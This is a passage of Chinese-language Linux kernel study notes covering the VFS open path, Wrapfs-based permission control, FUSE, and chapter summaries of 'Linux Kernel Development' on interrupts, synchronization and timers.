<li>然后是重头戏，<code>filp = path_openat(&amp;nd, op, flags | LOOKUP_RCU);</code></li>
<li><code>restore_nameidata</code></li>
</ul>
<p>阅读<a href="https://elixir.bootlin.com/linux/v5.4.168/source/fs/namei.c#L3511"><code>path_openat()</code></a>源代码。重点关注忽略了所有失败情况的下面的代码</p>
<pre><code class="language-c">file = alloc_empty_file(op-&gt;open_flag, current_cred());

const char *s = path_init(nd, flags);
while (!(error = link_path_walk(s, nd)) &amp;&amp;
       (error = do_last(nd, file, op)) &gt; 0) {
    nd-&gt;flags &amp;= ~(LOOKUP_OPEN|LOOKUP_CREATE|LOOKUP_EXCL);
    s = trailing_symlink(nd);
}
terminate_walk(nd);

return file;
</code></pre>
<h2 id="利用wrapfs管理权限"><a class="header" href="#利用wrapfs管理权限">利用Wrapfs管理权限</a></h2>
<p>限制文件读写：</p>
<ul>
<li>
<p>从<code>file_operations.read</code>和<code>file_operations.write</code>入手，并不好使，具体原因有待进一步发现。（可能是<code>file_operations.read_iter</code>和<code>file_operations.write_iter</code>的关系。因为就现在的文件系统，大部分都实现了后两者而不是前两者。）</p>
</li>
<li>
<p>从<code>inode_operations.permission</code>入手，相当于是可以动态的修改一个文件的<code>rwx</code>权限了，这样确实可以对读写进行有效控制，但是阻止不了移动、删除，因为移动和删除相当于是目录的权限管理了。</p>
</li>
<li>
<p>从<code>inode_operations.fileattr_get</code>入手（还有一个很具有迷惑性的方法<code>getattr</code>）(4.4没有这个方法！)</p>
</li>
<li>
<p>从<code>file_operations.unlocked_ioctl</code>和<code>file_operations.compat_ioctl</code>入手，结果发现在修改一个被我加了<code>i</code>属性的文件时根本没有调用过，只在<code>lsattr</code>的时候会调用，奇怪。</p>
<ul>
<li>
<p>跟踪发现是<code>faccessat</code>这个调用族做的检查</p>
<pre><code>faccessat(AT_FDCWD, &quot;aaa&quot;, W_OK)  = -1 EPERM (Operation not permitted)
faccessat(AT_FDCWD, &quot;aaa&quot;, W_OK)  = 0
</code></pre>
<p>源代码https://elixir.bootlin.com/linux/v4.4.295/source/fs/open.c#L337</p>
</li>
</ul>
</li>
<li>
<p>考虑<code>inode_operations.rename</code>和<code>inode_operations.unlink</code>.  因为跟踪发现他们和文件的移动和删除密切相关，用<code>strace</code>跟踪mv和rm的执行。</p>
<pre><code>mv =&gt; renameat2(AT_FDCWD, &quot;../i.md&quot;, AT_FDCWD, &quot;../i1.md&quot;, RENAME_NOREPLACE) = 0
rm =&gt; unlinkat(AT_FDCWD, &quot;aaa&quot;, 0)      = 0
</code></pre>
</li>
</ul>
<p>总结：从<code>permission</code>,<code>rename</code>,<code>unlink</code>入手。</p>
<h3 id="执行权限"><a class="header" href="#执行权限">执行权限</a></h3>
<p>以Linux5.4为例，跟踪<code>inode_permission</code>函数在<code>execve</code>的何时被调用进行权限检查。</p>
<pre><code class="language-c">[#0] 0xffffffff812d8690 → inode_permission(inode=0xffff8880064f1650, mask=0x81)
[#1] 0xffffffff812d8aed → may_lookup(nd=&lt;optimized out&gt;)
[#2] 0xffffffff812d8aed → link_path_walk(name=0xffff888004ce2021 &quot;bin/ls&quot;, nd=0xffffc9000020fd10)
[#3] 0xffffffff812db4c6 → link_path_walk(nd=&lt;optimized out&gt;, name=&lt;optimized out&gt;)
[#4] 0xffffffff812db4c6 → path_openat(nd=0xffffc9000020fd10, op=0xffffc9000020fe24, flags=&lt;optimized out&gt;)
[#5] 0xffffffff812ddfa1 → do_filp_open(dfd=&lt;optimized out&gt;, pathname=&lt;optimized out&gt;, op=0xffffc9000020fe24)
[#6] 0xffffffff812d16a7 → do_open_execat(fd=&lt;optimized out&gt;, name=0xffff888004ce2000, flags=&lt;optimized out&gt;)
[#7] 0xffffffff812d35c8 → __do_execve_file(fd=&lt;optimized out&gt;, filename=0xffff888004ce2000, flags=0x0, file=0x0 &lt;fixed_percpu_data&gt;, argv=&lt;optimized out&gt;, envp=&lt;optimized out&gt;)
[#8] 0xffffffff812d39a9 → do_execveat_common(flags=&lt;optimized out&gt;, filename=&lt;optimized out&gt;, fd=&lt;optimized out&gt;, argv=&lt;optimized out&gt;, envp=&lt;optimized out&gt;)
[#9] 0xffffffff812d39a9 → do_execve(__envp=&lt;optimized out&gt;, __argv=&lt;optimized out&gt;, filename=&lt;optimized out&gt;)
</code></pre>
<h3 id="添加权限字段"><a class="header" href="#添加权限字段">添加权限字段</a></h3>
<p>怎么向<code>inode</code>结构添加东西呢？</p>
<ul>
<li>
<p>inode的诞生：<code>super_operations-&gt;alloc_inode</code>: this method is called by <a href="https://elixir.bootlin.com/linux/v5.4.168/source/fs/inode.c#L225"><code>alloc_inode()</code> </a> to allocate memory for struct inode and initialize it. If this function is not defined, a simple ‘struct inode’ is allocated. Normally <code>alloc_inode</code> will be used to <strong>allocate a larger structure which contains a ‘struct inode’ embedded within it.</strong></p>
<p>我们定制他来产生<code>wrapfs_inode</code></p>
<p><code>&lt;fsname_iget&gt;</code>: 从设备中读取inode</p>
</li>
<li>
<p>inode的使用，从场景出发</p>
<ul>
<li>用户如果需要使用一个文件，他会使用<code>open</code>系列的系统调用，得到一个文件描述符。对于kernel来说，我们产生了一个<code>file</code>代表打开的文件，在上面介绍的进程的<code>files</code>字段中会存储所有打开的文件。之后的读写就针对<code>file</code>进行。</li>
<li>所以<code>open</code>是怎么找到<code>inode</code>的呢？简单的说，根据路径进行遍历。</li>
</ul>
</li>
<li>
<p>inode的回收：<code>super_operations-&gt;destroy_inode</code>: this method is called by <a href="https://elixir.bootlin.com/linux/v5.4.168/source/fs/inode.c#L274"><code>destroy_inode()</code> </a> to release resources allocated for struct inode. It is only required if <code>super_operations-&gt;alloc_inode</code> was defined and simply undoes anything done by <code>super_operations-&gt;alloc_inode</code>.</p>
</li>
<li>
<p>由于我们的文件系统是完全存在于内存的，可以忽略inode的dirty，write等和设备同步的操作。</p>
</li>
</ul>
<h3 id="和用户交换信息"><a class="header" href="#和用户交换信息">和用户交换信息</a></h3>
<p>从用户获得的信息最好是<code>filename</code> + <code>permission</code>。利用 <code>kern_path()</code>函数可以根据文件名获得<code>struct path</code>，里面有<code>mnt</code>还有<code>dentry</code>，这样拿到对应的inode就不是问题。</p>
<p>发送给用户的信息可以是<code>uuid+inode</code>，或者可以利用<code>inode</code>中的<code>i_dentry</code>链表选择一个文件名来保护，反正最后的权限会落到inode。</p>
<h2 id="fuse"><a class="header" href="#fuse">FUSE</a></h2>
<p><a href="https://man7.org/linux/man-pages/man4/fuse.4.html">fuse - Filesystem in Userspace (FUSE) device.</a></p>
<p>这个模型可以让你<strong>在User Level</strong>实现文件系统，原理大致是Kernel作为Client，而你的进程（往往是Daemon）作为Server，双方进行通信，你可以Hook一些操作。有一个Python的API绑定。</p>
<pre><code class="language-sh">sudo apt install libfuse3-dev fuse3
pip3 install pyfuse3
</code></pre>
<hr />
<p>https://www.kernel.org/doc/html/latest/filesystems/vfs.html#struct-file-system-type</p>
<p>https://zhuanlan.zhihu.com/p/34280875	</p>
<p>https://bean-li.github.io/vfs-inode-dentry/</p>
<p><a href="https://juejin.cn/post/6844903926735568904">解析open调用的系列文章，挺好的</a></p>
<p><a href="https://stackoverflow.com/questions/1184274/read-write-files-within-a-linux-kernel-module">内核如何读写文件</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="linux内核设计与实现笔记"><a class="header" href="#linux内核设计与实现笔记">《Linux内核设计与实现》笔记</a></h1>
<p>这不是一个很好的笔记。只是记录了一些我之前不知道或不明确的东西。很多我知道的重点没有记下来。</p>
<h2 id="第一二章-简介"><a class="header" href="#第一二章-简介">第一二章 简介</a></h2>
<p>我们可以将每个处理器在任何指定时间点上的活动概括为以下三者之一：</p>
<ul>
<li>运行于用户空间，执行用户进程。</li>
<li>运行于内核空间，处于进程上下文，代表某个特定进程的执行。</li>
<li>运行于内核空间，处于中断上下文，与任何进程无关，处理某个特定的中断。</li>
</ul>
<p>使用 GNU C 编译器。</p>
<p>内核中发生的内存错误会导致oops。内核中的内存不分页。</p>
<p>内核栈的大小是固定且不大的。这个可以在编译的时候进行配置。</p>
<h3 id="同步和并发"><a class="header" href="#同步和并发">同步和并发</a></h3>
<ul>
<li>Linux是抢占多任务操作系统，内核的进程调度程序对进程进行调度，内核必须与这些进程同步。</li>
<li>Linux支持SMP（对称多处理器系统）。所以如果没有适当保护，同时在两个及以上处理器上执行的内核代码很可能会同时访问共享的一个资源。</li>
<li>中断是异步到来的，如果不加适当的保护，中断完全有可能在代码访问资源的时候到来，访问同一段资源。</li>
<li>Linux内核可以抢占，如果不加上适当的保护，内核中一段正在执行的代码可能会被另一端代码抢占，从而有可能导致几段代码同时访问相同的资源。</li>
</ul>
<h2 id="第三章-进程"><a class="header" href="#第三章-进程">第三章 进程</a></h2>
<p>进程列表存放在一个<strong>双向循环列表</strong>中。</p>
<p>Linux通过Slab分配器分配<code>task_struct</code>结构，达到对象复用和缓存着色的目的。</p>
<p>在寄存器不多的架构，没有多余的寄存器专门存储<code>task_struct</code>的地址。栈尾的<code>thread_info</code>结构，通过偏移间接地查找<code>task_struct</code>结构。可以看<code>current</code>宏在不同架构上的实现。</p>
<p>进程的创建，<code>fork</code>是我们最熟悉的系统调用，还有<code>vfork</code>和<code>clone</code>，不过其实最后都是调用<code>clone</code>。对于内核来说进程=线程。进程<code>exit</code>之后，释放**除了内核栈、<code>thread_info</code>，<code>task_struct</code>**之外的全部资源。这些没有释放的资源交给父进程释放，如果父进程已经死了就交给<code>init</code>进程。</p>
<h2 id="第四章-进程调度"><a class="header" href="#第四章-进程调度">第四章 进程调度</a></h2>
<h2 id="第五章-系统调用"><a class="header" href="#第五章-系统调用">第五章 系统调用</a></h2>
<blockquote>
<p>关于Unix的接口设计有一句格言“提供机制而不是策略”。换句话说，Unix的系统调用抽象出了用于完成某种确定的目的的函数。至于这些函数怎么用完全不需要内核去关心。</p>
</blockquote>
<p>系统调用在出现错误的时候C库会把错误码写入<code>errno</code>&quot;全局变量&quot;。通过调用<code>perror</code>库函数，可以把该变量翻译成用户可以理解的错误字符串。</p>
<p>系统调用必须仔细检査它们所有的参数是否合法有效。系统调用在内核空间执行，如果任由用户将不合法的输入传递给内核，那么系统的安全和稳定将面临极大的考验。最重要的一种检査就是检査用户提供的指针是否有效。在接收一个用户空间的指针之前，内核必须保证：</p>
<ul>
<li>指针指向的内存区域属于用户空间。进程决不能哄骗内核去读内核空间的数据。</li>
<li>指针指向的内存区域在进程的地址空间里。进程决不能哄骗内核去读其他进程的数据。</li>
<li>如果是读，该内存应被标记为可读；如果是写，该内存应被标记为可写；如果是可执行，该内存被标记为可执行。进程决不能绕过内存访问限制。</li>
</ul>
<p>内核提供了两个方法来完成必须的检査和内核空间与用户空间之间数据的来回拷贝。注意，内核无论何时都不能轻率地接受来自用户空间的指针！这两个方法中必须经常有一个被使用。为了向用户空间写入数据，内核提供了 <code>copy_to_user()</code>。它需要三个参数。第一个参数是进程空间中的目的内存地址，第二个是内核空间内的源地址，最后一个参数是需要拷贝的数据长度(字节数)。为了从用户空间读取数据，内核提供了 <code>copy_from_user</code>，它和<code>copy_to_user()</code>相似。该函数把第二个参数指定的位置上的数据拷贝到第一个参数指定的位置上，拷贝的数据长度由第三个参数决定。如果执行失败，这两个函数返回的都是没能完成拷贝的数据的字节数。如果成功，则返回<code>0</code>。当出现上述错误时，系统调用返回<code>-EFAULT</code>。注意，<code>copy_to_user()</code>和<code>copy_from_user()</code>都有可能引起<strong>阻塞</strong>。当包含用户数据的页被换出到硬盘上而不是在物理内存上的时候，这种情况就会发生。此时，进程就会休眠，直到缺页处理程序将该页从硬盘重新换回物理内存。</p>
<h2 id="第六章-内核数据结构"><a class="header" href="#第六章-内核数据结构">第六章 内核数据结构</a></h2>
<h3 id="链表"><a class="header" href="#链表">链表</a></h3>
<p>相比普遍的链表实现方式（包括前面章节描述的通用方法），Linux内核的实现可以说独树一帜，它不是将数据结构塞入链表，而是将链表节点塞入数据结构。链表代码在头文件<code>＜linux/list.h＞</code>中声明，其数据结构很简单</p>
<pre><code class="language-c">struct list_head {
    struct list_head *next;
    struct list_head *prev;
}
</code></pre>
<p>关键在于理解<code>list_head</code>是怎么使用的，有一系列宏魔法。主要分成操作链表（复杂度为$O(1)$）和遍历链表（复杂度为$O(n)$）。Linux提供了很多链表操作方法——几乎是你所能想到的所有访问和操作链表方法，所有这些方法都可在头文件<code>＜linux/list.h＞</code>中找到。</p>
<h3 id="队列"><a class="header" href="#队列">队列</a></h3>
<p>Linux内核通用队列实现称为<code>kfifo</code>。它实现在文件<code>kemel/kfifo.c</code>中，声明在文件<code>＜linux/kfifo.h＞</code>中。</p>
<p>使用kfifo前，首先必须对它进行定义和初始化。和多数内核对象一样，有动态或者静态方法供你选择。动态方法更为普遍，有<code>kfifo_alloc</code>和<code>kfifo_init</code>两种。推入数据到队列需要通过<code>kfifo_in()</code>方法完成，摘取数据则需要通过函数<code>kfifo_out()</code>完成。不过如果仅仅想“偷窥”队列中的数据，而不真想删除它，你可以使用<code>kfifo_out_peek()</code>方法。撤销一个使用<code>kfifo_alloc()</code>分配的队列，调用<code>kfifo_free()</code>。</p>
<h3 id="映射-1"><a class="header" href="#映射-1">映射</a></h3>
<p>Linux内核提供了简单、有效的映射数据结构。但是它并非一个通用的映射。因为它的目标是：映射一个唯一的标识数(UID)到一个指针。<code>idr</code>数据结构用于映射用户空间的<code>UID</code>,比如将<code>inotify_watch</code>的描述符或者POSIX的定时器ID映射到内核中相关联的数据结构上，如<code>inotify_watch</code>或者<code>k_itimer</code>结构体。其命名仍然沿袭了内核中有些含混不清的命名体系，这个映射被命名为<code>idr</code>。</p>
<h3 id="树"><a class="header" href="#树">树</a></h3>
<p>Linux实现的红黑树称为rbtree。其定义在文件<code>lib/rbtree.c</code>中，声明在文件<code>&lt;linux/rbtree.h&gt;</code>中。除了一定的优化外，Linux的rbtree类似于前面所描述的经典红黑树，即保持了平衡性，所以插入效率和树中节点数目呈对数关系。</p>
<p>rbtree的实现并没有提供搜索和插入例程，这些例程希望由rbtree的用户自己定义。这是因为C语言不大容易进行泛型编程，同时Linux内核开发者们相信最有效的搜索和插入方法需要每个用户自己去实现。你可以使用rbtree提供的辅助函数，但你自己要实现比较操作算子。</p>
<h2 id="第七章-中断"><a class="header" href="#第七章-中断">第七章 中断</a></h2>
<p>中断本质上是一种特殊的电信号，由硬件设备发向处理器。处理器接收到中断后，会马上向操作系统反映此信号的到来，然后就由操作系统负责处理这些新到来的数据。硬件设备生成中断的时候并不考虑与处理器的时钟同换句话说就是中断随时可以产生。因此，内核随时可能因为新到来的中断而被打断。不同的设备对应的中断不同，而每个中断都通过一个唯一的数字标志。这些中断值通常被称为中断请求（IRQ）线。每个IRQ线都会被关联一个数值量。</p>
<p>中断可能随时发生，因此中断处理程序也就随时可能执行。所以必须保证中断处理程序能够<strong>快速执行</strong>，这样才能保证尽可能快地恢复中断代码的执行。</p>
<p>中断处理程序与其他内核函数的真正区别在于，中断处理程序是被内核调用来响应中断的，而它们运行于我们称之为<strong>中断上下文</strong>的特殊上下文中。</p>
<p>中断上下文和进程并没有什么瓜葛。与current宏也是不相干的(尽管它会指向被中断的进程)。因为没有后备进程，所以中断上下文<strong>不可以睡眠</strong>，否则又怎能再对它重新调度呢？因此，不能从中断上下文中调用某些函数。如果一个函数可能睡眠，就不能在你的中断处理程序中使用它。</p>
<p>有一些函数可以用来禁用/启用中断。</p>
<p><img src="Advanced/Linux/LinuxKernel/../images/image-20211226155249311.png" alt="image-20211226155249311" /></p>
<h3 id="中断处理程序"><a class="header" href="#中断处理程序">中断处理程序</a></h3>
<p><strong>驱动程序</strong>可以通过<code>request_irq()</code>函数<strong>注册</strong>一个中断处理程序。注意，request_irq()函数可能会睡眠，因此，不能在中断上下文或其他不允许阻塞的代码中调用该函数。</p>
<pre><code class="language-c">request_irq(unsigned int irq, irq_handler_t handler, unsigned long flags,
            const char *name, void *dev)
</code></pre>
<ul>
<li>第一个参数irq表示要分配的中断号。对某些设备，如传统PC设备上的系统时钟或键盘，这个值通常是预先确定的。而对于大多数其他设备来说，这个值要么是可以通过探测获取，要么可以通过编程动态确定。</li>
<li>第二个参数handler是一个指针，指向处理这个中断的实际中断处理程序。只要操作系统一接收到中断，该函数就被调用。</li>
<li>第五个参数dev用于共享中断线。当一个中断处理程序需要释放时（稍后讨论），dev将提供唯一的标志信息（cookie）,以便从共享中断线的诸多中断处理程序中删除指定的那一个。</li>
</ul>
<p>卸载驱动程序时，需要<strong>注销</strong>相应的中断处理程序，并释放中断线。上述动作需要调用：</p>
<pre><code class="language-c">void free_irq(unsigned int irq, void *dev)
</code></pre>
<p>如果指定的中断线不是共享的，那么，该函数删除处理程序的同时将禁用这条中断线。如果中断线是共享的，则仅删除dev所对应的处理程序，而这条中断线本身只有在删除了最后一个处理程序时才会被禁用。</p>
<p>以下是一个中断处理程序声明：</p>
<pre><code class="language-c">static irqreturn_t intr_handler(int irq, void *dev)
</code></pre>
<ul>
<li>第一个参数irq就是这个处理程序要响应的中断的中断号。如今，这个参数已经没有太大用处了。</li>
<li>第二个参数dev是一个通用指针，它与在中断处理程序注册时传递给<code>request_irq()</code>的参数dev必须一致。如果该值有唯一确定性(这样做是为了能支持共享)，那么它就相当于一个cookie，<strong>可以用来区分共享同一中断处理程序的多个设备</strong>。</li>
<li>中断处理程序的返回值是一个特殊类型：<code>irqreturn_t</code>。中断处理程序可能返回两个特殊的值：<code>IRQ_NONE</code>和<code>IRQ_HANDLED</code>。当中断处理程序检测到一个中断，但该中断对应的设备并不是在注册处理函数期间指定的产生源时，返回<code>IRQ_NONE</code>；当中断处理程序被正确调用，且确实是它所对应的设备产生了中断时，返回<code>IRQ_HANDLED</code>。</li>
</ul>
<p>内核接收一个中断后，它将<strong>依次调用在该中断线上注册的每一个处理程序</strong>。因此，一个处理程序必须知道它是否应该为这个中断负责（dev参数）。如果与它相关的设备并没有产生中断，那么处理程序应该立即退出。</p>
<p>编写中断处理程序需要注意的事情：中断处理程序运行在<strong>中断上下文</strong>。Linux中的中断处理程序是<strong>无须重入</strong>的。当一个给定的中断处理程序正在执行时，相应的中断线在所有处理器上都会被屏蔽掉，以防止在同一中断线上接收另一个新的中断。通常情况下，所有其他的中断都是打开的，所以这些不同中断线上的其他中断都能被处理，但当前中断线总是被禁止的。所有的中断处理程序必须尽可能的<strong>迅速</strong>。尽量把工作从中断处理程序中分离出来，放在<strong>下半部</strong>来执行，因为下半部可以在更合适的时间运行。为了应对栈大小的减少，中断处理程序拥有了自己的栈，每个处理器一个，大小为一页。这个栈就称为中断栈，你的中断处理程序不必关心栈如何设置，或者内核栈的大小是多少。总而言之，<strong>尽量节约内核栈空间</strong>。</p>
<h2 id="第八章-中断下半部"><a class="header" href="#第八章-中断下半部">第八章 中断下半部</a></h2>
<p>下半部的任务就是执行与中断处理密切相关但中断处理程序本身不执行的工作。在理想的情况下，最好是中断处理程序将所有工作都交给下半部分执行，因为我们希望在中断处理程序中完成的工作越少越好（也就是越快越好）。我们期望中断处理程序能够尽可能快地返回。</p>
<p>但是，中断处理程序注定要完成一部分工作。例如，中断处理程序几乎都需要通过操作硬件对中断的到达进行确认，有时它还会从硬件拷贝数据。因为这些工作对时间非常敏感，所以只能靠中断处理程序自己去完成。</p>
<ul>
<li>如果一个任务对时间非常敏感，将其放在中断处理程序中执行。</li>
<li>如果一个任务和硬件相关，将其放在中断处理程序中执行。</li>
<li>如果一个任务要保证不被其他中断（特别是相同的中断）打断，将其放在中断处理程序中执行。</li>
<li>其他所有任务，考虑放置在下半部执行。</li>
</ul>
<h3 id="softirq"><a class="header" href="#softirq">softirq</a></h3>
<p>一个注册的软中断必须在被标记后才会执行。这被称作触发软中断(raising the softirq )。通常，中断处理程序会在返回前标记它的软中断，使其在稍后被执行。于是，在合适的时刻，该软中断就会运行。</p>
<h3 id="tasklet-star"><a class="header" href="#tasklet-star">tasklet :star:</a></h3>
<p>tasklet是利用软中断实现的一种下半部机制。我们之前提到过，它和进程没有任何关系。tasklet和软中断在本质上很相似，行为表现也相近，但是，它的接口更简单，锁保护也要求较低。<strong>大多数情况下用tasklet效果都不错，而且它们还非常容易使用</strong>。因为tasklet是通过软中断实现的，所以它们本身也是软中断。</p>
<h2 id="第九章-内核同步介绍"><a class="header" href="#第九章-内核同步介绍">第九章 内核同步介绍</a></h2>
<p>如果多个执行线程同时访问和操作数据，就可能发生各线程之间互相覆盖共享数据的情况，是造成系统不稳定的隐患，而且这种错误<strong>难以跟踪和调试</strong>。</p>
<p>从2.0开始，内核开始支持对称个临界区多处理器。在这之前，只有中断发生或者内核代码明确请求重新调度执行另一个任务的时候，数据才可能被并发访问。现在，<strong>运行在两个不同处理器上的内核代码完全可能在同一时刻并发访问共享数据</strong>。2.6开始，Linux内核发展成抢占式内核，调度程序可以在任何时刻<strong>抢占正在运行的内核代码</strong>，重新调度其他的进程执行。</p>
<p><strong>临界区</strong>就是访问和操作共享数据的代码段。如果两个程序可能在一个临界区中同时执行，这就是<strong>竞争条件race condition</strong>。避免竞争条件被称为<strong>同步synchronization</strong>。</p>
<p>同步的关键是找出哪些数据需要保护。要给数据而不是代码加锁。问自己下面的问题：</p>
<ol>
<li>这个数据是不是全局的？除了当前线程外其他线程能不能访问他？</li>
<li>这个数据会不会在进程上下文和中断上下文共享？它是不是要在两个不同的中断处理程序中共享？</li>
<li>进程在访问数据的时候可不可以被抢占？被调度的新进程会不会访问同一数据？</li>
<li>当前进程会不会睡眠（阻塞）在某些资源上？如果会，他会让共享数据处于何种状态？</li>
<li>如果这个函数又在另一个处理器上被调度会发生什么呢？</li>
<li>如何确保代码远离并发威胁？</li>
</ol>
<p>如何避免死锁？有一些简单的规则：</p>
<ol>
<li>按顺序加锁。如果需要嵌套的使用多个锁，必须按照相同的顺序去获取他们，在代码使用锁的地方，对锁的获取顺序加上注释是一个好习惯。</li>
<li>设计应该尽量简单。</li>
<li>防止发生饥饿。代码的执行是否一定会正常结束？</li>
<li>不要重复请求同一个锁。</li>
</ol>
<h2 id="第十章-内核同步方法"><a class="header" href="#第十章-内核同步方法">第十章 内核同步方法</a></h2>
<p>Linux内核提供了一组相当完备的同步方法。</p>
<h3 id="atomic"><a class="header" href="#atomic">atomic</a></h3>
<p>原子操作是其他同步方法的基石。针对<strong>整数</strong>的原子操作只能对<code>atomic_t</code>类型的数据进行处理，定义在<a href="https://elixir.bootlin.com/linux/latest/source">/</a><a href="https://elixir.bootlin.com/linux/latest/source/include">include</a>/<a href="https://elixir.bootlin.com/linux/latest/source/include/linux">linux</a>/<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/types.h">types.h</a>中。还有针对<strong>位</strong>的原子操作。</p>
<pre><code class="language-c">typedef struct {
	int counter;
} atomic_t;
</code></pre>
<p>使用原子整型操作需要的声明在<a href="https://elixir.bootlin.com/linux/latest/source">/</a><a href="https://elixir.bootlin.com/linux/latest/source/include">include</a>/<a href="https://elixir.bootlin.com/linux/latest/source/include/linux">linux</a>/<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/atomic">atomic</a>。一些体系结构会提供一些额外的原子操作方法，比如x86。</p>
<pre><code class="language-c">atomic_t v;
atomic_set(&amp;v, 4);
atomic_add(2, &amp;v);
atomic_inc(&amp;v);
int a = atomic_read(&amp;v);
</code></pre>
<p>原子整数操作最常见的用途是实现计数器。</p>
<h3 id="spin-lock"><a class="header" href="#spin-lock">spin lock</a></h3>
<p>自旋锁最多只能被一个可执行线程持有。如果一个执行线程试图获得一个已经被持有的自旋锁，那么线程就会进行<strong>busy waiting</strong>，直到锁重新可用。如果锁没有被争用，那么请求锁的执行线程便能立刻得到它。<strong>自旋锁可以防止多于一个的线程同时进入临界区</strong>。<strong>自旋锁不应该被长时间持有，用于短时间内进行轻量级加锁</strong>。使用自旋锁需要的声明定在<a href="https://elixir.bootlin.com/linux/v5.15/source">/</a><a href="https://elixir.bootlin.com/linux/v5.15/source/include">include</a>/<a href="https://elixir.bootlin.com/linux/v5.15/source/include/linux">linux</a>/<a href="https://elixir.bootlin.com/linux/v5.15/source/include/linux/spinlock_types.h">spinlock_types.h</a>。</p>
<p>自旋锁可以用在中断处理程序中，不能使用信号量，因为他们会导致睡眠。在中断处理程序中使用自旋锁时，一定要在获取锁之前，先<strong>禁止本地中断</strong>。否则中断处理程序可能会打断正持有锁的内核代码，就死锁了。内核提供了禁止中断同时请求锁的接口<a href="https://elixir.bootlin.com/linux/v5.15/source/include/linux/spinlock.h#L391"><code>spin_lock_irqsave</code></a>。相应的<code>spin_unlock_irqrestore</code>。</p>
<p>要注意，锁的是代码（临界区），真正要保护的是<strong>数据</strong>。</p>
<h3 id="read-write-lock"><a class="header" href="#read-write-lock">read-write lock</a></h3>
<p>Linux内核提供了专门的读-写锁 。这种自旋为读和写分别提供了不同的锁。一个或多个 任务可以并发地持有读者锁。相反，用于写的锁最多只能被一个写任务持有，而且此时不能有并发的读操作。用于<strong>读写明确区分</strong>的场景，并且有利于读者，写者容易<strong>饥饿</strong>。</p>
<p>使用读写锁需要的定义声明在<a href="https://elixir.bootlin.com/linux/latest/source">/</a><a href="https://elixir.bootlin.com/linux/latest/source/include">include</a>/<a href="https://elixir.bootlin.com/linux/latest/source/include/linux">linux</a>/<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/rwlock.h">rwlock.h</a>。</p>
<h3 id="semaphore"><a class="header" href="#semaphore">semaphore</a></h3>
<p>信号量是一种睡眠锁。如果有一个任务试图获得一个不可用的信号量时，信号量就会将其推进一个等待队列，然后让其睡眠。当持有的信号量可用后，处于等待队列中的那个任务将被唤醒，并获得该信号量。</p>
<ul>
<li>争用信号量的进程在等待锁重新变成可用的时候会睡眠，所以信号量适合用于锁会被长时间持有的情况。反之，如果锁被短时间持有，使用信号量就不太合适。</li>
<li>在中断上下文不可以睡眠，所以不可以使用信号量。</li>
<li>占用信号量的同时不要占用自旋锁。因为在等待信号量的时候可能会睡眠，而持有自旋锁的时候不应该睡眠。</li>
<li>往往在需要<strong>和用户空间同步</strong>的时候，你的代码会需要睡眠，这时信号量就是唯一的选择。因为持有信号量的时候可以睡眠。</li>
</ul>
<p>使用信号量需要的定义声明在<a href="https://elixir.bootlin.com/linux/latest/source">/</a><a href="https://elixir.bootlin.com/linux/latest/source/include">include</a>/<a href="https://elixir.bootlin.com/linux/latest/source/include/linux">linux</a>/<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/semaphore.h">semaphore.h</a>。</p>
<h3 id="rw_semaphore"><a class="header" href="#rw_semaphore">rw_semaphore</a></h3>
<p>读写信号量。</p>
<h3 id="mutex"><a class="header" href="#mutex">mutex</a></h3>
<p>mutex和信号量计数为1的semaphore表现的行为一致。</p>
<p><strong>mutex上锁者必须负责给其再解锁——你不能在一个上下文中锁定一个mutex，而在另一个上下文中它解锁。这个限制使得mutex不适合内核同用户空间复杂的同步场景</strong>。mutex只能通过官方API管理，不可以被拷贝、手动初始化或者重复初始化。持有mutex的时候进程不可以退出。当打开内核配置选项<code>CONFIG_DEBUG_MUTEXES</code>后，就会有多种检测来确保这些（还有别的）约束得以遵守。</p>
<h3 id="completion"><a class="header" href="#completion">completion</a></h3>
<p>如果内核中一个任务需要发出信号，通知另一任务发生了某个特定时间，利用completion是让两个任务得以同步的简单方法。（我之前用了wait_queue，看了一下completion也是用了wait相关的数据结构）</p>
<p><a href="https://elixir.bootlin.com/linux/latest/source">/</a><a href="https://elixir.bootlin.com/linux/latest/source/include">include</a>/<a href="https://elixir.bootlin.com/linux/latest/source/include/linux">linux</a>/<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/completion.h">completion.h</a></p>
<h3 id="bkl"><a class="header" href="#bkl">BKL</a></h3>
<p>新代码中不再使用BKL</p>
<h3 id="禁止抢占"><a class="header" href="#禁止抢占">禁止抢占</a></h3>
<h3 id="顺序和屏障"><a class="header" href="#顺序和屏障">顺序和屏障</a></h3>
<p>硬件或者编译器可能会对读写进行重新排序，比如</p>
<pre><code class="language-c">a = 1;
b = 2;
</code></pre>
<p>可能在a存放新值之前就在b存放新值。</p>
<h2 id="十一章-定时器和时间管理"><a class="header" href="#十一章-定时器和时间管理">十一章 定时器和时间管理</a></h2>
<p>定义在<a href="https://elixir.bootlin.com/linux/v5.16/source">/</a><a href="https://elixir.bootlin.com/linux/v5.16/source/include">include</a>/<a href="https://elixir.bootlin.com/linux/v5.16/source/include/linux">linux</a>/<a href="https://elixir.bootlin.com/linux/v5.16/source/include/linux/jiffies.h">jiffies.h</a>中的<code>jiffles</code>。</p>
<pre><code class="language-c">extern u64 __cacheline_aligned_in_smp jiffies_64;
extern unsigned long volatile __cacheline_aligned_in_smp __jiffy_arch_data jiffies;
</code></pre>
<p>实时时钟 (RTC)是 来持久存放系统时间的设备。即便系统关闭后，它也可以靠主板上微型电池提供的电力保持系统的计时。在PC体系结构中 RTC和CMOS集成在一起，且RTC的运行和BIOS保存设置都是通过同一个电池供电的。</p>
<p>在x86体系结构中 主要采用可编程中断时钟(PIT) 。</p>
<p><strong>定时器</strong>的使用很简单，我们只需要执行一个初始化工作，设置超时时间，指定超时发生后执行的函数，然后激活定时器。指定的函数将在定时器到期时自动执行。定时器由结构<code>timer_list</code>表示，定义在文件<a href="https://elixir.bootlin.com/linux/v5.16/source">/</a><a href="https://elixir.bootlin.com/linux/v5.16/source/include">include</a>/<a href="https://elixir.bootlin.com/linux/v5.16/source/include/linux">linux</a>/<a href="https://elixir.bootlin.com/linux/v5.16/source/include/linux/timer.h">timer.h</a>中。使用定时器并不需要深入了解该数据结构。事实上深入该结构反会使你的代码不能保证对可能发生的变化提供支持。</p>
